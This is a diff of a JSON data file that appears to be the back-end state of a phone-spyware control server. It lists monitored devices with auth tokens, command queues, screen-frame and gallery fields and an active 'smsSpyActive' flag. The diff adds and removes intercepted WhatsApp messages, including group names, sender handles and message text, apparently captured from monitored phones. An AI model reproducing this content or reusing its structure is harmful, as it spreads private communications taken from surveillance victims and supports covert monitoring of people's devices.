@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040928098,
+    "lastSeen": 1775040930991,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040928704,
+    "lastSeen": 1775040931806,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12215 pesan): ~ Fegg",
+        "content": ".bratgambar qory sayang alfy,bahrul, aznil, salman",
+        "time": "01/04 18:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040933588
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12214 pesan): ~ 🕷️",
@@ -8056,14 +8064,6 @@
         "time": "01/04 18:38",
         "pkg": "com.whatsapp",
         "receivedAt": 1775039890834
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1899 pesan): ~ haikal a.a",
-        "content": "11 2 allkayu fpt andro only no macro",
-        "time": "01/04 18:38",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775039890764
       }
     ],
     "galleryPhotos": [],
